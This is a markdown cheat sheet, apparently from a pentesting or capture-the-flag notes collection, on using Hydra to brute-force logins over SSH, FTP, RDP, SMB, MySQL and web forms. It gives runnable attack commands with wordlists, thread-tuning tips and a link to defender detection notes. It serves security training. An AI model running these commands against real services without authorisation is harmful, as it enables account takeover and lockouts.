# 🔑 Hydra Cheat Sheet

**Hydra** is a fast online (network) login brute-forcer. It throws username/password combinations at a live service until one works.

```bash
# General syntax
hydra [-l user | -L users.txt] [-p pass | -P passlist.txt] [target] [protocol]
```

> 💡 Lowercase `-l`/`-p` = single value. Uppercase `-L`/`-P` = list/file.

---

## Credential & Target Flags

| Flag | Example | Description |
| --- | --- | --- |
| `-l` | `-l admin` | Single username |
| `-L` | `-L users.txt` | Username list |
| `-p` | `-p password123` | Single password |
| `-P` | `-P /usr/share/wordlists/rockyou.txt` | Password list |
| `-C` | `-C combos.txt` | Colon-separated `user:pass` combo file |
| `-s` | `-s 2222` | Use a non-default port |
| `-t` | `-t 4` | Parallel tasks (lower for SSH to avoid lockouts) |
| `-f` | `-f` | Stop after the first valid login |
| `-V` | `-V` | Verbose — show every attempt |
| `-vV` | `-vV` | Even more verbose |

## Supported Protocols (common)

| Protocol | Example | Description |
| --- | --- | --- |
| `ssh` | `hydra -l user -P pass.txt ssh://10.10.10.1` | SSH login |
| `ftp` | `hydra -l user -P pass.txt ftp://10.10.10.1` | FTP login |
| `rdp` | `hydra -l user -P pass.txt rdp://10.10.10.1` | Remote Desktop |
| `smb` | `hydra -l user -P pass.txt smb://10.10.10.1` | SMB login |
| `mysql` | `hydra -l root -P pass.txt mysql://10.10.10.1` | MySQL login |
| `http-get` | `hydra -l user -P pass.txt 10.10.10.1 http-get /admin` | HTTP Basic Auth |

## Web Form Brute-forcing

The `http-post-form` module needs three colon-separated parts:
`"<path>:<post-body>:<failure-string>"`

```bash
hydra -l admin -P rockyou.txt 10.10.10.1 http-post-form \
  "/login.php:username=^USER^&password=^PASS^:Invalid credentials"
```

| Placeholder | Meaning |
| --- | --- |
| `^USER^` | Where Hydra injects the username |
| `^PASS^` | Where Hydra injects the password |
| failure string | Text in the response that means "login failed" |

> 💡 Use `F=text` for a failure string or `S=text` for a success string (`S=Location` is handy when a successful login redirects).

---

## 🧭 Common commands

```bash
# SSH, single user, full wordlist, stop on success, slow threads
hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 -f ssh://10.10.10.1

# FTP, user list + password list, verbose
hydra -L users.txt -P pass.txt -V ftp://10.10.10.1

# Web login form
hydra -l admin -P rockyou.txt 10.10.10.1 http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=incorrect"
```

> 💡 **Gotchas:**
> - Grab the exact POST body and field names from your browser dev-tools or [burpsuite](../burpsuite) — guessing them is the #1 reason `http-post-form` "finds" nothing or everything.
> - Online brute-force is **slow & loud** and locks accounts. Check the password policy first (`nxc smb --pass-pol`, see [netexec](../netexec)) and keep `-t` low for SSH.
> - Use `https-post-form` for TLS sites and `-s <port>` for non-default ports.
> - Have a hash instead of a live login? Crack it offline with [john](../john)/[hashcat](../hashcat) — far faster.

> 🔗 This is what brute-force looks like to a defender → [DETECTION.md → Brute-force](../DETECTION.md#2-brute-force-login).
